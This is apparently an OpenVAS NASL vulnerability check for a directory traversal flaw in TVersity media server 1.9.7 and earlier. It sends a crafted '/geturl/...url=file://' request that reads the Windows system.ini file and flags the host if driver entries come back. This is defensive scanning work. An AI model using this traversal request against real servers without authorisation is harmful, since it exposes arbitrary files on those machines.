###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_tversity_dir_trav_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# TVersity Directory Traversal Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation may allow an attacker to obtain sensitive information,
  which can lead to launching further attacks.
  Impact Level: Application";
tag_affected = "TVersity version 1.9.7 and prior";
tag_insight = "The flaw is due to an input validation error in the TVersity media
  server when processing web requests can be exploited to disclose arbitrary
  files via directory traversal attacks.";
tag_solution = "No solution or patch is available as of 15th March, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://tversity.com/";
tag_summary = "The host is running TVersity and is prone to directory traversal
  vulnerability.";

if(description)
{
  script_id(802619);
  script_version("$Revision: 12 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-03-15 12:12:12 +0530 (Thu, 15 Mar 2012)");
  script_name("TVersity Directory Traversal Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18603");
  script_xref(name : "URL" , value : "http://aluigi.org/adv/tversity_1-adv.txt");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/110802/tversity_1-adv.txt");

  script_description(desc);
  script_summary("Check if TVersity is vulnerable to directory traversal");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_require_ports("Services/www",41952);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
url = "";
dir = "";
port = 0;
banner = "";

## Get TVersity Port
port = get_http_port(default:41952);
if(!port){
  port = 41952;
}

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Confirm the application before trying exploit
banner = get_http_banner(port: port);
if(!banner || "TVersity Media Server" >!< banner){
  exit(0);
}

foreach dir (make_list("c:", "d:", "e:", "f:"))
{
  ## Construct attack request
  url = "/geturl/%2e?type=audio/mpeg&url=file://" + dir +
        "/windows/&ext=system.ini";

  ## Check for patterns present in system.ini file in the response
  if(http_vuln_check(port:port, url:url, pattern:"\[drivers\]",
                     check_header:TRUE))
  {
    security_warning(port);
    exit(0);
  }
}
